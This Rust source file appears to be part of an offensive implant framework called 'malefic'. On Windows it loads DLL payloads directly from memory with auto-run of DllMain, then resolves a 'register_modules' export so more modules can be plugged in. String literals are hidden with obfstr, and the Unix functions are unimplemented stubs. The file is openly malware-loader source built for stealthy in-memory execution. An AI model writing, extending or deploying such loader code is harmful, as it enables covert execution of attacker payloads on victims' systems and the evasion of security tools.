use obfstr::obfstr;
use core::{
    ffi::c_void,
    ptr::null
};

use crate::{debug, CommonError::{
    self,
    ArgsError
}};
#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const c_void, CommonError> {
    use crate::{MaleficLoadLibrary, LOAD_MEMORY, AUTO_RUN_DLL_MAIN};
    
    if bins.is_empty() || bundle.is_empty() {
        return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));
    }
    debug!("[+] in load module!");
    debug!("[+] bins len is {}", bins.len());
    let new_bundle = format!("{}{}", bundle, "\x00");

    let dark_module = MaleficLoadLibrary(
            AUTO_RUN_DLL_MAIN | LOAD_MEMORY as u32, 
            null(), 
            bins.as_ptr() as _, 
            bins.len(), 
            new_bundle.as_ptr() as _) as _;

    Ok(dark_module)
}

#[cfg(target_os = "windows")]
#[cfg(feature = "professional")]
pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const malefic_win_kit::dynamic::MaleficLoadLibrary::DarkModule, CommonError> {
    use malefic_win_kit::dynamic::
        MaleficLoadLibrary::{
            DarkModule, MaleficLoadLibrary, AUTO_RUN_DLL_MAIN, LOAD_MEMORY
        };
    
    if bins.is_empty() || bundle.is_empty() {
        return Err(ArgsError(obfstr!("bins or bundle is empty :)").to_string()));
    }
    debug!("[+] in load module!");
    debug!("[+] bins len is {}", bins.len());
    let new_bundle = format!("{}{}", bundle, "\x00");
    let dark_module = MaleficLoadLibrary(
            AUTO_RUN_DLL_MAIN | LOAD_MEMORY as u32, 
            null(), 
            bins.as_ptr() as _, 
            bins.len(), 
            new_bundle.as_ptr() as _);
    if dark_module.is_null() || !(*dark_module).is_successed {
        return Err(ArgsError("dark module load failed!".to_string()));
    }
    Ok(dark_module)
}

#[cfg(target_os = "windows")]
#[cfg(feature = "community")]
pub unsafe fn call_fresh_modules(module: *const c_void) -> Option<*const c_void> {
    use crate::{MaleficGetFuncAddrWithModuleBaseDefault, DarkModule};
    let module: *const DarkModule = module as _;
    if module.is_null() || !(*module).is_successed {
        return None;
    }

    let func_addr = MaleficGetFuncAddrWithModuleBaseDefault((*module).module_base, obfstr::obfstr!("register_modules").as_ptr(), obfstr::obfstr!("register_modules").len());
    if func_addr.is_null() {
        return None;
    }
    Some(func_addr)
}

#[cfg(target_os = "windows")]
#[cfg(feature = "professional")]
pub unsafe fn call_fresh_modules(module: *const malefic_win_kit::dynamic::MaleficLoadLibrary::DarkModule) -> Option<*const c_void> {
    use malefic_win_kit::dynamic::DynamicLibraryUtils::GetFuncAddrWithModuleBaseDefault;
    if module.is_null() || !(*module).is_successed {
        return None;
    }

    let func_addr = GetFuncAddrWithModuleBaseDefault((*module).module_base, obfstr::obfstr!("register_modules").as_bytes());
    if func_addr.is_null() {
        return None;
    }
    Some(func_addr)
}

#[cfg(target_family = "unix")]
pub unsafe fn load_module(bins: Vec<u8>, bundle: String) -> Result<*const c_void, CommonError> {
    todo!()
}

#[cfg(target_family = "unix")]
pub unsafe fn call_fresh_modules(module: *const c_void) -> Option<*const c_void> {
    todo!()
}